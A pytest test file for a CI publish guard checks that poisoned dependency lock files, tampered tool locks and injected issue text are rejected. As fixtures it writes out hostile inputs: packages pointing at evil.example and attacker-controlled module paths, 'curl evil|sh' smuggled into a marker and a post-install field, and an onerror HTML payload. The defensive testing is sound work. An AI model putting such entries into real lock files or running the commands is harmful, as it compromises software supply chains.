"""The publish job treats the test jobs' output as hostile data. These pin that gate down."""
from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location("ci_publish_guard", ROOT / "scripts" / "ci_publish_guard.py")
assert _spec and _spec.loader
guard = importlib.util.module_from_spec(_spec)
sys.modules["ci_publish_guard"] = guard
_spec.loader.exec_module(guard)

H = "a" * 64


def lock(tmp_path: Path, body: str) -> Path:
    p = tmp_path / "requirements.lock"
    p.write_text(body)
    return p


# ── python lock ──────────────────────────────────────────────────────────────

def test_the_real_lock_is_accepted():
    pins = guard.check_python_lock(ROOT / "requirements.lock")
    assert pins["mcp"] and pins["pydantic"]
    assert "httpx" in pins                                   # names containing 'http' are fine


def test_minimal_valid_lock(tmp_path):
    p = lock(tmp_path, f"# header\nfoo==1.2.3 \\\n    --hash=sha256:{H} \\\n    --hash=sha256:{'b' * 64}\n    # via -r requirements.txt\n")
    assert guard.check_python_lock(p) == {"foo": "1.2.3"}


def test_environment_markers_are_allowed(tmp_path):
    p = lock(tmp_path, f"pywin32==312 ; sys_platform == 'win32' \\\n    --hash=sha256:{H}\n")
    assert guard.check_python_lock(p) == {"pywin32": "312"}


@pytest.mark.parametrize("body", [
    "foo==1.0\n",                                                              # no hash at all
    f"foo==1.0 \\\n    --hash=sha256:{H}\nbar==2.0\n",                          # second pin unhashed
    f"foo @ https://evil.example/foo.whl \\\n    --hash=sha256:{H}\n",           # direct URL
    f"foo @ git+https://evil.example/foo.git \\\n    --hash=sha256:{H}\n",       # VCS
    f"--extra-index-url https://evil.example/simple\nfoo==1.0 \\\n    --hash=sha256:{H}\n",
    f"--index-url https://evil.example/simple\nfoo==1.0 \\\n    --hash=sha256:{H}\n",
    f"-e .\nfoo==1.0 \\\n    --hash=sha256:{H}\n",                              # editable install
    f"foo>=1.0 \\\n    --hash=sha256:{H}\n",                                    # not an exact pin
    f"foo==1.0 \\\n    --hash=md5:{'a' * 32}\n",                                # weak hash
    f"foo==1.0 \\\n    --hash=sha256:{'z' * 64}\n",                             # not hex
    f"foo==1.0 ; python_version > '3' && curl evil|sh \\\n    --hash=sha256:{H}\n",
    f"foo==1.0 \\\n    --hash=sha256:{H}\nfoo==2.0 \\\n    --hash=sha256:{H}\n",  # same package twice
    "",                                                                        # empty
    "# only a comment\n",
    f"    --hash=sha256:{H}\n",                                                 # orphan hash
])
def test_hostile_or_malformed_locks_are_rejected(tmp_path, body):
    with pytest.raises(guard.Rejected):
        guard.check_python_lock(lock(tmp_path, body))


def test_oversized_and_non_text_files_are_rejected(tmp_path):
    big = tmp_path / "big.lock"
    big.write_bytes(b"a" * (guard.MAX_BYTES + 1))
    with pytest.raises(guard.Rejected):
        guard.check_python_lock(big)
    binary = tmp_path / "bin.lock"
    binary.write_bytes(b"\xff\xfe\x00\x00")
    with pytest.raises(guard.Rejected):
        guard.check_python_lock(binary)


def test_symlinks_are_rejected(tmp_path):
    real = lock(tmp_path, f"foo==1.0 \\\n    --hash=sha256:{H}\n")
    link = tmp_path / "link.lock"
    link.symlink_to(real)
    with pytest.raises(guard.Rejected):
        guard.check_python_lock(link)


# ── tool lock ────────────────────────────────────────────────────────────────

def test_the_real_tool_lock_is_accepted():
    assert guard.check_tool_lock(ROOT / "config" / "tool-lock.json")


def _tool_lock(tmp_path: Path, mutate) -> Path:
    data = json.loads((ROOT / "config" / "tool-lock.json").read_text())
    mutate(data)
    p = tmp_path / "tool-lock.json"
    p.write_text(json.dumps(data))
    return p


def test_tool_lock_with_a_redirected_module_is_rejected(tmp_path):
    def evil(d):
        d["tools"]["nuclei"]["target"] = "github.com/attacker/nuclei/cmd/nuclei@v9.9.9"
    with pytest.raises(guard.Rejected):
        guard.check_tool_lock(_tool_lock(tmp_path, evil))


def test_tool_lock_with_an_unknown_tool_is_rejected(tmp_path):
    def evil(d):
        d["tools"]["backdoor"] = {"version": "1.0.0", "target": "github.com/attacker/backdoor@v1.0.0"}
    with pytest.raises(guard.Rejected):
        guard.check_tool_lock(_tool_lock(tmp_path, evil))


def test_tool_lock_with_extra_keys_is_rejected(tmp_path):
    def evil(d):
        d["tools"]["nuclei"]["post_install"] = "curl evil | sh"
    with pytest.raises(guard.Rejected):
        guard.check_tool_lock(_tool_lock(tmp_path, evil))


@pytest.mark.parametrize("content", ["not json", "[]", '{"schema": 2, "tools": {}}', '{"schema": 1, "tools": {}}'])
def test_tool_lock_garbage_is_rejected(tmp_path, content):
    p = tmp_path / "x.json"
    p.write_text(content)
    with pytest.raises(guard.Rejected):
        guard.check_tool_lock(p)


# ── text for issue / PR bodies ───────────────────────────────────────────────

def test_text_cannot_break_out_of_a_code_fence():
    out = guard.safe_text("before\n```\n# injected heading\n```\nafter")
    assert "```" not in out and "`" not in out


def test_text_defuses_mentions_links_html_and_control_chars():
    out = guard.safe_text("ping @octocat and @org/team, see #1234 <img src=x onerror=1>\x1b[31m\x00")
    assert "@octocat" not in out and "@org" not in out         # zero-width space inserted
    assert "#1234" not in out
    assert "<img" not in out and "\x1b" not in out and "\x00" not in out


def test_text_is_truncated():
    out = guard.safe_text("x" * 50_000, max_chars=100)
    assert len(out) < 200 and "truncated" in out


# ── diffs ────────────────────────────────────────────────────────────────────

def test_diff_lists_only_changes():
    body, changed = guard.diff_versions({"a": "1.0", "b": "2.0"}, {"a": "1.1", "b": "2.0", "c": "0.1"}, "package")
    assert changed and "`a`" in body and "`c`" in body and "`b`" not in body


def test_diff_with_no_changes_reports_none():
    _, changed = guard.diff_versions({"a": "1.0"}, {"a": "1.0"}, "package")
    assert not changed


def test_cli_exit_codes(tmp_path, capsys):
    good = ROOT / "requirements.lock"
    assert guard.main(["python-lock", str(good)]) == 0
    assert guard.main(["python-lock", str(lock(tmp_path, "foo==1\n"))]) == 1
    assert guard.main(["diff-python", str(good)]) == 3          # identical to the committed lock → nothing to publish
    assert "REJECTED" in capsys.readouterr().err


# ── installed-vs-locked ──────────────────────────────────────────────────────

def test_installed_differs_flags_a_moved_package_and_skips_absent_ones():
    from importlib import metadata
    real = metadata.version("pytest")
    assert guard.installed_differs({"pytest": real}) == {}
    assert guard.installed_differs({"pytest": "0.0.1"}) == {"pytest": ("0.0.1", real)}
    assert guard.installed_differs({"definitely-not-installed-pkg": "1.0"}) == {}
